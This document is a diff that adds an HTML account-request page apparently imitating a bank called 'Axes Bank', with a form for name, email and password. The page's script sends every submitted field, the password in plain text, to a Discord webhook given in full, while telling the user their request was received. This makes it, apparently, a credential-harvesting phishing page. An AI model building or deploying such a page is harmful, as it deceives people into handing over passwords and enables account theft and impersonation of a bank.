@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Create Account Request - Axes Bank</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #1a1a1a;
+      color: #fff;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .form-container {
+      background: #2d2d2d;
+      border-radius: 16px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.22);
+      padding: 32px 28px 20px 28px;
+      min-width: 300px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    h2 { color: #7289da; margin-bottom: 18px; }
+    label { display: block; margin-top: 14px; color: #43b581; font-weight: bold;}
+    input[type="text"], input[type="password"], input[type="email"] {
+      width: 100%; max-width: 280px; padding: 10px;
+      border-radius: 8px; border: none;
+      margin-top: 5px; margin-bottom: 12px; font-size: 1rem;
+      background: #181a20; color: #fff; box-shadow: 0 1px 5px #2223;
+    }
+    button {
+      background: #7289da; color: #fff; font-weight: bold;
+      border: none; border-radius: 8px; padding: 12px 36px;
+      font-size: 1rem; cursor: pointer; margin-top: 10px; transition: background 0.16s;
+    }
+    button:hover { background: #43b581; }
+    .success, .error {
+      margin-top: 14px; font-size: 0.95rem; text-align: center;
+    }
+    .success { color: #43b581; }
+    .error { color: #ff4c6c; }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Account Request</h2>
+    <form id="requestForm">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" name="name" required maxlength="48">
+      <label for="email">Valid Email Address</label>
+      <input type="email" id="email" name="email" required maxlength="48">
+      <label for="password">Desired Password</label>
+      <input type="password" id="password" name="password" required maxlength="32">
+      <button type="submit">Create</button>
+      <div id="statusMsg"></div>
+    </form>
+  </div>
+  <script>
+    document.getElementById('requestForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      const name = document.getElementById('name').value.trim();
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (!name || !email || !password) {
+        document.getElementById('statusMsg').textContent = "Fill all fields!";
+        document.getElementById('statusMsg').className = "error";
+        return;
+      }
+      if (!email.match(/^[^@]+@[^@]+\.[^@]+$/)) {
+        document.getElementById('statusMsg').textContent = "Invalid email format.";
+        document.getElementById('statusMsg').className = "error";
+        return;
+      }
+
+      document.getElementById('statusMsg').textContent = "Sending your request...";
+      document.getElementById('statusMsg').className = "";
+
+      fetch("https://discord.com/api/webhooks/1425052971602804757/u0XMNSEucxYLj7AiCilfgVqemmQjP7nLSnvHs_GFJgt3gbp6mx9pK-WqPz8FHjfhLlnI", {
+        method: "POST",
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          content: `New Account Request:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`
+        })
+      })
+      .then(r => {
+        if (r.ok) {
+          document.getElementById('statusMsg').textContent = "Account request sent! We will contact you soon.";
+          document.getElementById('statusMsg').className = "success";
+          document.getElementById('requestForm').reset();
+        } else {
+          throw new Error("Request failed");
+        }
+      })
+      .catch(() => {
+        document.getElementById('statusMsg').textContent = "Failed to send request. Try again later.";
+        document.getElementById('statusMsg').className = "error";
+      });
+    });
+  </script>
+</body>
+</html>
